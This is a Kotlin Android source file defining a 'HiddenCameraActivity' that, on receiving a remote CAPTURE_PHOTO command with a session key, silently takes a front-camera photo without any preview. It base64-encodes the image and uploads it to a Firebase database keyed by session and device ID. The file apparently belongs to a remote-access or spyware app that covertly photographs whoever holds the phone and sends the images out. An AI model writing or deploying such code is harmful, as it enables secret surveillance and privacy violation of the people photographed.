package com.jonas.x24

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.Image
import android.media.ImageReader
import android.os.Bundle
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.util.Log
import androidx.core.app.ActivityCompat
import com.google.firebase.database.FirebaseDatabase
import android.graphics.BitmapFactory
import android.graphics.Bitmap
import java.io.ByteArrayOutputStream

import java.nio.ByteBuffer

class HiddenCameraActivity : Activity() {

    private var cameraDevice: CameraDevice? = null
    private var imageReader: ImageReader? = null
    private var backgroundThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null
    private var sessionKey: String? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        sessionKey = intent.getStringExtra("SESSION_KEY")
        if (sessionKey == null) {
            finish()
            return
        }

        startBackgroundThread()

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
            takePicture()
        } else {
            postResult("ERROR", "Camera permission denied.", "CAPTURE_PHOTO")
            finish()
        }
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraBackground").also { it.start() }
        backgroundHandler = Handler(backgroundThread!!.looper)
    }

    private fun stopBackgroundThread() {
        backgroundThread?.quitSafely()
        try {
            if (Thread.currentThread() != backgroundThread) {
                backgroundThread?.join()
            }
            backgroundThread = null
            backgroundHandler = null
        } catch (e: InterruptedException) {
            e.printStackTrace()
        }
    }

    private fun takePicture() {
        val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            val cameraId = manager.cameraIdList.firstOrNull { id ->
                manager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
            } ?: manager.cameraIdList.firstOrNull()

            if (cameraId == null) {
                postResult("ERROR", "No camera found.", "CAPTURE_PHOTO")
                finish()
                return
            }

            val characteristics = manager.getCameraCharacteristics(cameraId)
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val size = map?.getOutputSizes(ImageFormat.JPEG)?.firstOrNull() ?: android.util.Size(640, 480)

            imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1).apply {
                setOnImageAvailableListener({ reader ->
                    var image: Image? = null
                    try {
                        image = reader.acquireLatestImage()
                        val buffer: ByteBuffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.capacity())
                        buffer.get(bytes)


                        val currentSession = sessionKey
                        if (currentSession == null) {
                            postResult("ERROR", "Session key missing.", "CAPTURE_PHOTO")
                            return@setOnImageAvailableListener
                        }

                        // Decode to Bitmap
                        val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)

                        if (bitmap != null) {
                            // Scale down if needed
                            var scaledBitmap = bitmap
                            if (bitmap.width > 1024 || bitmap.height > 1024) {
                                val ratio = Math.min(1024f / bitmap.width, 1024f / bitmap.height)
                                val width = Math.round(ratio * bitmap.width)
                                val height = Math.round(ratio * bitmap.height)
                                scaledBitmap = Bitmap.createScaledBitmap(bitmap, width, height, true)
                            }

                            val baos = ByteArrayOutputStream()
                            scaledBitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos)
                            val imageBytes = baos.toByteArray()
                            val base64Image = Base64.encodeToString(imageBytes, Base64.NO_WRAP)
                            postResult("IMAGE", base64Image, "CAPTURE_PHOTO")

                            if (scaledBitmap != bitmap) {
                                scaledBitmap.recycle()
                            }
                            bitmap.recycle()
                        } else {
                            postResult("ERROR", "Failed to decode captured photo.", "CAPTURE_PHOTO")
                        }
} catch (e: Exception) {
                        postResult("ERROR", "Failed to process image: ${e.message}", "CAPTURE_PHOTO")
                    } finally {
                        image?.close()
                        finish()
                    }
                }, backgroundHandler)
            }

            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                return
            }

            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    createCaptureSession()
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    cameraDevice = null
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    cameraDevice = null
                    postResult("ERROR", "Camera error: $error", "CAPTURE_PHOTO")
                    finish()
                }
            }, backgroundHandler)
        } catch (e: CameraAccessException) {
            e.printStackTrace()
            postResult("ERROR", "Camera access exception: ${e.message}", "CAPTURE_PHOTO")
            finish()
        }
    }

    private fun createCaptureSession() {
        try {
            val surface = imageReader?.surface ?: return
            val captureBuilder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            captureBuilder?.addTarget(surface)

            cameraDevice?.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    if (cameraDevice == null) return
                    try {
                        session.capture(captureBuilder!!.build(), null, backgroundHandler)
                    } catch (e: CameraAccessException) {
                        postResult("ERROR", "Capture failed: ${e.message}", "CAPTURE_PHOTO")
                        finish()
                    }
                }

                override fun onConfigureFailed(session: CameraCaptureSession) {
                    postResult("ERROR", "Capture session configuration failed.", "CAPTURE_PHOTO")
                    finish()
                }
            }, backgroundHandler)
        } catch (e: CameraAccessException) {
            e.printStackTrace()
        }
    }

    private fun postResult(type: String, data: String, command: String = "") {
        val currentSessionKey = sessionKey ?: return
        val prefs = getSharedPreferences("x24_prefs", android.content.Context.MODE_PRIVATE)
        val currentDeviceId = prefs.getString("DEVICE_ID", null) ?: return
        val ref = FirebaseDatabase.getInstance().reference.child("sessions").child(currentSessionKey).child("devices").child(currentDeviceId).child("results").push()
        val payload = mapOf(
            "type" to type,
            "data" to data,
            "command" to command,
            "timestamp" to System.currentTimeMillis()
        )
        ref.setValue(payload)
    }

    override fun onDestroy() {
        super.onDestroy()
        cameraDevice?.close()
        imageReader?.close()
        stopBackgroundThread()
    }
}